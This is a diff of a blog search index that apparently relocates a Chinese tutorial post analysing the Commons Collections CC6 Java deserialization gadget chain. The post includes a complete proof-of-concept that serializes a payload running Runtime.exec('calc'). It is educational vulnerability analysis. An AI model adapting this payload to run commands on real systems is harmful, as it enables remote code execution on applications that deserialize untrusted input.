@@ -1,6 +1,291 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>CC6反序列化链</title>
+    <url>/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/</url>
+    <content><![CDATA[<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732217521294-561919d4-5333-40a4-b10e-3769df62eb9b.png"
+                      class=""
+                > 
+
+<p>CC6底层用的也是invokertransformer的transform去进行命令执行</p>
+<p>然后用的是lazymap这条链子</p>
+<ul>
+<li><p>利用的依赖</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;3.2&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure></div></li>
+</ul>
+<h2 id="底层出口LazyMap-InvokerTransformer"><a href="#底层出口LazyMap-InvokerTransformer" class="headerlink" title="底层出口LazyMap+InvokerTransformer"></a>底层出口LazyMap+InvokerTransformer</h2><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line">import java.lang.reflect.InvocationTargetException;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line">public class CC6_1 &#123;</span><br><span class="line">    public static void main(String[] args) throws InvocationTargetException, IllegalAccessException, NoSuchMethodException &#123;</span><br><span class="line">        Runtime runtime = Runtime.getRuntime();</span><br><span class="line">        InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;);</span><br><span class="line">        //初始化InvokerTransformer</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;Object, Object&gt;();</span><br><span class="line">        Map decorateMap = LazyMap.decorate(hashMap, invokerTransformer);</span><br><span class="line">        //利用LazyMap的decorate去初始化LazyMap内部的factory，然后get函数里面存在factory.transfer()</span><br><span class="line">        Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;</span><br><span class="line">        Method lazyGetMethod = lazyMapClass.getDeclaredMethod(&quot;get&quot;, Object.class);</span><br><span class="line">        lazyGetMethod.setAccessible(true);</span><br><span class="line">        //让get函数可以被直接操作</span><br><span class="line">        lazyGetMethod.invoke(decorateMap, runtime);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>我们顺着代码来吧</p>
+<h4 id="InvokerTransformer初始化-利用方式"><a href="#InvokerTransformer初始化-利用方式" class="headerlink" title="InvokerTransformer初始化+利用方式"></a>InvokerTransformer初始化+利用方式</h4><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732184143397-2a3dd1e4-5620-4b58-a911-cfd8ba39d109.png"
+                      class="" title="img"
+                > 
+
+<p>我们查看InvokerTransformer这个类</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732184234521-97287f70-915b-433f-85e9-3bbc62f8ed65.png"
+                      class="" title="img"
+                > 
+
+<p>里面存在这个初始化函数，这里面的参数已经够我们想到如果有地方可以invoke调用就可以造成rce了</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732184279009-bcc5128e-fae0-4eed-befd-325c69d52140.png"
+                      class="" title="img"
+                > 
+
+<p>这里还真的有，并且input参数是我们传入的，传入个Runtime对象就可以实现RCE了</p>
+<h4 id="LazyMap初始化以及利用"><a href="#LazyMap初始化以及利用" class="headerlink" title="LazyMap初始化以及利用"></a>LazyMap初始化以及利用</h4><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732184381641-a533fdb3-f0f7-454f-8ab3-e526270c984b.png"
+                      class="" title="img"
+                > 
+
+<p>我们查看下LazyMap的decorate函数</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732184447459-a8fe7ba8-4dcb-4331-b098-0e971bfdcb74.png"
+                      class="" title="img"
+                > 
+
+<p>因为LazyMap下面那个构造函数是protected所以我们无法直接利用，所以利用public的decorate函数去初始化，重点是这一行<strong>this.factory &#x3D; FactoryTransformer.getInstance(factory);</strong> </p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732184508030-ef78abb4-0ba4-427d-9b02-d009efbd1580.png"
+                      class=""
+                > 
+
+<p>可以看到factory也是transformer类型，并且它初始化赋值了，所以我们让factory为invokerTransformer的对象</p>
+<p>那我们这时候是不是就只缺一个哪个地方让这个对象**.transfer** 的地方了</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732184684820-8cfb7640-6f51-4e9d-a0d8-aec9c8f778cf.png"
+                      class="" title="img"
+                > 
+
+<p>LazyMap里面的get函数，factory我们初始化为invokerTransformer的对象了，那他再transofrmer，并且key我们可控，传一个Runtime对象是不是就可以了</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732184778636-62da0f9a-06d9-4b27-ac08-8639fd7e6dab.png"
+                      class="" title="img"
+                > 
+
+<h2 id="TiedMapEntry去调用LazyMap的get函数"><a href="#TiedMapEntry去调用LazyMap的get函数" class="headerlink" title="TiedMapEntry去调用LazyMap的get函数"></a>TiedMapEntry去调用LazyMap的get函数</h2><h3 id="getValue分析"><a href="#getValue分析" class="headerlink" title="getValue分析"></a>getValue分析</h3><p>因为我们需要找到一个地方是可以readobject里面调用get并且参数和对象可控的，但是没有找到适配的，所以我们就要再往上找</p>
+<p>某某函数-&gt;LazyMap.get()</p>
+<p>依据ysoSerial链子找到了TiedMapEntry</p>
+<p>我们自己审一下先，这个类哪里可以调用get，并且参数是否可控</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732184993706-a24e292b-c7eb-40db-840f-6d544d9288b7.png"
+                      class="" title="img"
+                > 
+
+<p>看到他的getValue函数，他是map.get(key)</p>
+<p>如果map可以为LazyMap，我们初始化他的factory对象为InvokerTransformer对象</p>
+<p>然后LazyMap调用get是不是就是上面的</p>
+<p>factory.transfer(key) &#x3D;&#x3D; InvokerTransformer.transfer(key)</p>
+<p>那如果key可控为Runtime.class呢</p>
+<p>factory.transfer(runtime) &#x3D;&#x3D; InvokerTransformer.transfer(runtime)</p>
+<p>就实现RCE了</p>
+<p>去看看TiedMapEntry含有什么参数并且怎么实例化的</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732185253051-d272f369-f8d6-4d91-8cfb-fed77ce2eeca.png"
+                      class="" title="img"
+                > 
+
+<p>可以看出他可以序列化这个TiedMapEntry</p>
+<p>然后map也是Map对象，LazyMap是Map的子类，所以二者其实一样的</p>
+<p>Object可以是个对象，那就是刚好如果可控给他一个Runtime对象</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732185336849-ce7efe4e-dc9f-44b4-b53c-b22911b9e6cb.png"
+                      class="" title="img"
+                > 
+
+<p>实例化不仅是public而且两个特别需要的参数都是可控的 </p>
+<h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class CC6_2 &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        //TiedMapEntry 里面存在get函数的调用，我们可以用它来调用lazymap</span><br><span class="line">        Runtime runtime = Runtime.getRuntime();</span><br><span class="line">        //实例化Runtime对象</span><br><span class="line">        InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;,</span><br><span class="line">                new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;);</span><br><span class="line">        //实例化InvokerTransformer对象</span><br><span class="line">        HashMap&lt;Object,Object&gt; hashmap = new HashMap&lt;Object, Object&gt;();</span><br><span class="line">        Map decorateMap = LazyMap.decorate(hashmap,invokerTransformer);</span><br><span class="line">        //实例化LazyMap对象</span><br><span class="line">        TiedMapEntry tiedMapEntry = new TiedMapEntry(decorateMap,runtime);</span><br><span class="line">        //实例化TiedMapEntry对象</span><br><span class="line">        tiedMapEntry.getValue();</span><br><span class="line">        //getValue函数为public，直接调用</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>真的很简单写下来就会发现</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732185886275-80fcbeac-6e3b-411a-aa65-c74ca0b26aa2.png"
+                      class="" title="img"
+                > 
+
+<h3 id="hashCode分析"><a href="#hashCode分析" class="headerlink" title="hashCode分析"></a>hashCode分析</h3><p>因为这个类本身没有自定义的序列化和反序列化函数，所以还得找，我们找哪里的函数调用了getvalue并且看看参数可控不可控</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732186113991-1fef0431-e82e-4834-98f2-77470cadfcdf.png"
+                      class="" title="img"
+                > 
+
+<p>时发现它本身的hashCode调用了getValue，此时因为是他自身的，所以hashCode并不需要参数可控，能直接调用就行了</p>
+<p>也写一下代码吧</p>
+<h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h3><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732186224096-1f5e6d40-2bce-4ccd-9d4c-06f5256bdcd4.png"
+                      class="" title="img"
+                >
+
+<p>算了，太懒了不写了，发现其实就是把getvalue换成了hashCode，因为hashCode里面会调用getValue，本质上一样</p>
+<p>其实这里也可以想想入口怎么样很完美了</p>
+<p>因为如果有个readObject里面hashMap.hashCode()，那就直接完成链子了</p>
+<h2 id="HashMap的hashCode方法"><a href="#HashMap的hashCode方法" class="headerlink" title="HashMap的hashCode方法"></a>HashMap的hashCode方法</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>我们查看下HashMap的类</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732186462197-d2363a51-a6ce-4fcb-8ce8-69fbec970487.png"
+                      class="" title="img"
+                >
+
+<p>可以序列化和反序列化</p>
+<p>这里其实跟URL利用hashmap反序列化连起来了</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732186598740-daa1c4ac-8397-461f-b59d-79e24f9bcd81.png"
+                      class="" title="img"
+                >
+
+<p>put里面有个hash(key)函数的调用，我们再深入一步看看</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732186642224-70347f1b-0bcc-4f6c-889b-546e2e9cd40e.png"
+                      class="" title="img"
+                >
+
+<p>直接就看到hashCode</p>
+<p>并且key.hashCode()，key还可控啊</p>
+<p>我们观察下他的反序列化readObject</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732186743782-82c1870a-770b-423f-a649-373e983edeaf.png"
+                      class="" title="img"
+                >
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732186811484-b13033d9-1c5f-4c8f-9c28-e69d83a65246.png"
+                      class="" title="img"
+                > 
+
+<p>所以其实我们都不用put函数，readObject里面就自己会调用hash(key)，key如果可控就直接完成了链子了</p>
+<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><ul>
+<li><p>1、Runtime没有办法序列化和反序列化，所以我们需要利用反射，就需要CC1里面的递归调用transform疯狂进行invoke，然后实例化出一个Runtime对象，然后再命令执行</p>
+</li>
+<li><p>2、put里面也会有hash(key)，所以序列化的时候就会弹一次计算器，所以我们可以put的时候让key是个没啥用的东西，之后利用反射再把值修改好</p>
+</li>
+<li><p>3、因为后面我们用了hash，LazyMap作为键值，所以这里会出现判断他的key是否存在，不存在才会执行transform，所以我们需要把它的key给删掉</p>
+</li>
+</ul>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732191324913-42f0aa79-f8a5-4629-9267-2bb5ef4b7da0.png"
+                      class="" title="img"
+                > 
+
+<p>这里的原因是IDEA debug时会调用toString方法，但是CC5中就是利用的toString链子，就是说它会走到lazyMap的get函数那里</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732217866498-7fc86c27-338e-4795-9539-2faef1e29e69.png"
+                      class="" title="img"
+                > 
+
+<p>所以此时我们lazymap的key是null，虽然进去了if，但是factory没有变成我们命令执行所需要的东西**（因为put的时候会造成反序列化RCE，所以我们不想要put的时候就被调用，在put后通过反射再修改）** ，所以没有作用，然后执行map.get(key)，将key值传进去了，而key值是我们传给TiedMapEntry的</p>
+<p>因为TiedMapEntry.getValue() -&gt; map.get(key)</p>
+<p>map为LazyMap对象，key是我们传入给TiedMapEntry的值</p>
+<h3 id="大概流程"><a href="#大概流程" class="headerlink" title="大概流程"></a>大概流程</h3><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732218025778-dd0e767e-581c-4b72-9102-b6371c831a8e.png"
+                      class="" title="img"
+                > 
+
+<p>然后debug会调用toString</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732218115401-3944a040-d484-4fa3-b257-0cecc3840a61.png"
+                      class="" title="img"
+                > 
+
+<p>toString调用getValue</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732218137120-fbe32afe-9dd5-496f-bd16-b84456732c2c.png"
+                      class="" title="img"
+                > 
+
+<p>map是我们传入的LazyMap对象</p>
+<p>后一步是LazyMap的get(key)函数</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732218195747-7a1988f4-d56b-49a8-bc5f-5d92728864be.png"
+                      class="" title="img"
+                > 
+
+<p>此时虽然进去了if但是factory不是我们命令执行所需要的对象，所以没什么作用，然后就会造成给map.get(key);，给LazyMap的key赋值</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732218406941-53298b35-2662-41e3-9741-cca0cc80e249.png"
+                      class="" title="img"
+                > 
+
+<p>后续我们修改LazyMap的factory对象可以造成命令执行，但是LazyMap的key已经变成传入的2了，所以就进入不了这个if </p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732218493629-bfd47bb2-7c68-4af8-82c5-56c3aa162198.png"
+                      class="" title="img"
+                > 
+
+<p>这就是我们要加上删除key的操作的原因</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732218516554-806c2ac5-1e3c-4aaa-bdea-3f28b0914b25.png"
+                      class="" title="img"
+                > 
+
+<h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class Poc &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = new HashMap&lt;Object, Object&gt;();</span><br><span class="line">        Map lazyMap = LazyMap.decorate(hashMap,new ConstantTransformer(&quot;1&quot;));</span><br><span class="line">        //这里传一个没啥用的transformer对象，先put进去再修改，不然put的时候就已经执行命令了</span><br><span class="line">        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,&quot;2&quot;);</span><br><span class="line">        HashMap&lt;Object,Object&gt; expMap = new HashMap&lt;Object, Object&gt;();</span><br><span class="line">        expMap.put(tiedMapEntry,&quot;3&quot;);</span><br><span class="line">        lazyMap.remove(&quot;2&quot;);</span><br><span class="line">        //******************//删除键值很重要</span><br><span class="line">        Class&lt;?&gt; lazyMapClass = LazyMap.class;</span><br><span class="line">        Field factory_ = lazyMapClass.getDeclaredField(&quot;factory&quot;);</span><br><span class="line">        factory_.setAccessible(true);</span><br><span class="line">        factory_.set(lazyMap,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        System.out.println(lazyMap);</span><br><span class="line">        serialize(expMap);</span><br><span class="line">        unserialize(&quot;ser.bin&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    public static void serialize(Object obj) throws Exception &#123;</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static Object unserialize(String Filename) throws Exception &#123;</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));</span><br><span class="line">        Object obj = ois.readObject();</span><br><span class="line">        return obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+]]></content>
+      <categories>
+        <category>漏洞原理分析</category>
+      </categories>
+      <tags>
+        <tag>反序列化</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>C3p0反序列化</title>
     <url>/2025/03/26/C3p0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
     <content><![CDATA[<p>C3P0是一个开源的<code>JDBC</code>连接池，它实现了数据源和<code>JNDI</code>绑定，支持JDBC3规范和JDBC2的标准扩展。使用它的开源项目有Hibernate、Spring等。</p>
@@ -430,291 +715,6 @@
                 > 
 
 ]]></content>
-      <tags>
-        <tag>反序列化</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CC6反序列化链</title>
-    <url>/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/</url>
-    <content><![CDATA[<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732217521294-561919d4-5333-40a4-b10e-3769df62eb9b.png"
-                      class=""
-                > 
-
-<p>CC6底层用的也是invokertransformer的transform去进行命令执行</p>
-<p>然后用的是lazymap这条链子</p>
-<ul>
-<li><p>利用的依赖</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;3.2&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure></div></li>
-</ul>
-<h2 id="底层出口LazyMap-InvokerTransformer"><a href="#底层出口LazyMap-InvokerTransformer" class="headerlink" title="底层出口LazyMap+InvokerTransformer"></a>底层出口LazyMap+InvokerTransformer</h2><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line">import java.lang.reflect.InvocationTargetException;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line">public class CC6_1 &#123;</span><br><span class="line">    public static void main(String[] args) throws InvocationTargetException, IllegalAccessException, NoSuchMethodException &#123;</span><br><span class="line">        Runtime runtime = Runtime.getRuntime();</span><br><span class="line">        InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;);</span><br><span class="line">        //初始化InvokerTransformer</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;Object, Object&gt;();</span><br><span class="line">        Map decorateMap = LazyMap.decorate(hashMap, invokerTransformer);</span><br><span class="line">        //利用LazyMap的decorate去初始化LazyMap内部的factory，然后get函数里面存在factory.transfer()</span><br><span class="line">        Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;</span><br><span class="line">        Method lazyGetMethod = lazyMapClass.getDeclaredMethod(&quot;get&quot;, Object.class);</span><br><span class="line">        lazyGetMethod.setAccessible(true);</span><br><span class="line">        //让get函数可以被直接操作</span><br><span class="line">        lazyGetMethod.invoke(decorateMap, runtime);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
-
-<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>我们顺着代码来吧</p>
-<h4 id="InvokerTransformer初始化-利用方式"><a href="#InvokerTransformer初始化-利用方式" class="headerlink" title="InvokerTransformer初始化+利用方式"></a>InvokerTransformer初始化+利用方式</h4><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732184143397-2a3dd1e4-5620-4b58-a911-cfd8ba39d109.png"
-                      class="" title="img"
-                > 
-
-<p>我们查看InvokerTransformer这个类</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732184234521-97287f70-915b-433f-85e9-3bbc62f8ed65.png"
-                      class="" title="img"
-                > 
-
-<p>里面存在这个初始化函数，这里面的参数已经够我们想到如果有地方可以invoke调用就可以造成rce了</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732184279009-bcc5128e-fae0-4eed-befd-325c69d52140.png"
-                      class="" title="img"
-                > 
-
-<p>这里还真的有，并且input参数是我们传入的，传入个Runtime对象就可以实现RCE了</p>
-<h4 id="LazyMap初始化以及利用"><a href="#LazyMap初始化以及利用" class="headerlink" title="LazyMap初始化以及利用"></a>LazyMap初始化以及利用</h4><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732184381641-a533fdb3-f0f7-454f-8ab3-e526270c984b.png"
-                      class="" title="img"
-                > 
-
-<p>我们查看下LazyMap的decorate函数</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732184447459-a8fe7ba8-4dcb-4331-b098-0e971bfdcb74.png"
-                      class="" title="img"
-                > 
-
-<p>因为LazyMap下面那个构造函数是protected所以我们无法直接利用，所以利用public的decorate函数去初始化，重点是这一行<strong>this.factory &#x3D; FactoryTransformer.getInstance(factory);</strong> </p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732184508030-ef78abb4-0ba4-427d-9b02-d009efbd1580.png"
-                      class=""
-                > 
-
-<p>可以看到factory也是transformer类型，并且它初始化赋值了，所以我们让factory为invokerTransformer的对象</p>
-<p>那我们这时候是不是就只缺一个哪个地方让这个对象**.transfer** 的地方了</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732184684820-8cfb7640-6f51-4e9d-a0d8-aec9c8f778cf.png"
-                      class="" title="img"
-                > 
-
-<p>LazyMap里面的get函数，factory我们初始化为invokerTransformer的对象了，那他再transofrmer，并且key我们可控，传一个Runtime对象是不是就可以了</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732184778636-62da0f9a-06d9-4b27-ac08-8639fd7e6dab.png"
-                      class="" title="img"
-                > 
-
-<h2 id="TiedMapEntry去调用LazyMap的get函数"><a href="#TiedMapEntry去调用LazyMap的get函数" class="headerlink" title="TiedMapEntry去调用LazyMap的get函数"></a>TiedMapEntry去调用LazyMap的get函数</h2><h3 id="getValue分析"><a href="#getValue分析" class="headerlink" title="getValue分析"></a>getValue分析</h3><p>因为我们需要找到一个地方是可以readobject里面调用get并且参数和对象可控的，但是没有找到适配的，所以我们就要再往上找</p>
-<p>某某函数-&gt;LazyMap.get()</p>
-<p>依据ysoSerial链子找到了TiedMapEntry</p>
-<p>我们自己审一下先，这个类哪里可以调用get，并且参数是否可控</p>
-<img  
